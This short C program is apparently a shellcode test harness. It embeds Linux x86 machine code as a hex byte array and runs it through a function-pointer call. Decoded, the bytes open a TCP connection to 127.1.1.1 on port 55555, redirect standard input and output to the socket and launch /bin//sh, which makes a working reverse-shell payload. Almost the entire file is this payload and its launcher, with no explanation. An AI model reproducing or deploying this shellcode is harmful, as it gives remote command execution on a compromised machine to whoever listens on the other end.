#include <stdio.h>
#include<string.h>
unsigned char code[] = \
"\x68"
"\x7f\x01\x01\x01"
"\x5e\x66\x68"
"\xd9\x03"
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
"\xeb\xce";
main ()
{
    printf("Shellcode Length: %d\n", strlen(code));
    _asm_ ("movl $0xffffffff, %eax\n\t"
                    "movl %eax, %ebx\n\t"
                    "movl %eax, %ecx\n\t"
                    "movl %eax, %edx\n\t"
                    "movl %eax, %esi\n\t"
                    "movl %eax, %edi\n\t"
                    "movl %eax, %ebp\n\t");
    int (*ret)() = (int(*)())code;
    ret();
}
